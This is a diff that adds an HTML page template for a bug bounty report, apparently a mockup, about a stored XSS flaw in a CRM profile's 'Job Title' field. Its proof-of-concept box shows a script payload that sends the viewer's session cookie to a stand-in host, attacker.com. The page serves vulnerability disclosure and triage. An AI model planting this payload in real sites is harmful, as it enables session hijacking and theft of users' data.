@@ -1,0 +1,28 @@
+<div class="col-12">
+  <div class="row align-items-center mb-4">
+    <div class="col">
+      <h2 class="h5 page-title"><small class="text-muted">Report Detail</small><br />#BB-902: Stored XSS in CRM User Profile</h2>
+    </div>
+    <div class="col-auto">
+      <span class="badge badge-pill badge-danger mr-2">CVSS 8.2</span>
+      <button type="button" class="btn btn-outline-primary">Message Researcher</button>
+    </div>
+  </div>
+  <div class="card shadow mb-4">
+    <div class="card-body p-5">
+      <h4 class="mb-3">Vulnerability Description</h4>
+      <p class="text-muted">An attacker can inject a malicious script into the 'Job Title' field of their profile. When a CRM admin views the profile, the script executes in the admin context, potentially leading to session hijacking.</p>
+
+      <h5 class="mt-4">Proof of Concept</h5>
+      <div class="card bg-dark text-success p-3 mb-4">
+        <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</code>
+      </div>
+
+      <h5 class="mt-4">Internal Impact Audit</h5>
+      <ul class="list-unstyled">
+        <li><i class="fe fe-check-circle text-success mr-2"></i> PII Access: <strong>Yes</strong></li>
+        <li><i class="fe fe-check-circle text-success mr-2"></i> Privilege Escalation: <strong>No</strong></li>
+      </ul>
+    </div>
+  </div>
+</div>
